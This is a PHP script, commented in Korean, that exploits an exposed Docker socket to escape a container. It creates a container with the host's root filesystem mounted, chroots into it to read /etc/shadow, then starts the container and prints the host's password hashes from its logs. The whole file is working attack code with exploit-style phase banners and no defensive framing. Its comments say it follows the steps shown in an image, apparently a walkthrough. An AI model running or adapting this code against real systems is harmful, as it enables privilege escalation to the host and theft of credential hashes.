<?php
echo "[*] Phase 1: Creating Escape Container...\n";
$sock = socket_create(AF_UNIX, SOCK_STREAM, 0);
socket_connect($sock, "/var/run/docker.sock");

// 이미지의 '컨테이너 생성' 파트 반영
$payload = json_encode([
    "Image" => "ubuntu:latest",
    "Cmd" => ["chroot", "/host_root", "cat", "/etc/shadow"],
    "HostConfig" => ["Binds" => ["/:/host_root"]]
]);

$req1 = "POST /v1.41/containers/create HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: " . strlen($payload) . "\r\nConnection: close\r\n\r\n" . $payload;
socket_write($sock, $req1);
$res1 = ""; while ($buf = socket_read($sock, 2048)) { $res1 .= $buf; }
preg_match('/"Id":"([^"]+)"/', $res1, $matches);
$id = $matches[1];
echo "[+] Container ID: " . substr($id, 0, 12) . "\n";

// '탈출(start)' 파트 반영
echo "[*] Phase 2: Starting Container...\n";
$sock2 = socket_create(AF_UNIX, SOCK_STREAM, 0);
socket_connect($sock2, "/var/run/docker.sock");
socket_write($sock2, "POST /v1.41/containers/$id/start HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n");
socket_read($sock2, 2048);

//  이미지의 '비밀번호 파일(logs)' 파트 반영
echo "\n--- HOST SHADOW FILE ---\n";
$sock3 = socket_create(AF_UNIX, SOCK_STREAM, 0);
socket_connect($sock3, "/var/run/docker.sock");
socket_write($sock3, "GET /v1.41/containers/$id/logs?stdout=true HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n");
while($out = socket_read($sock3, 2048)) {
    echo preg_replace('/[^\x20-\x7E\n]/', '', $out); 
}
echo "\n---------------------------\n";
?>
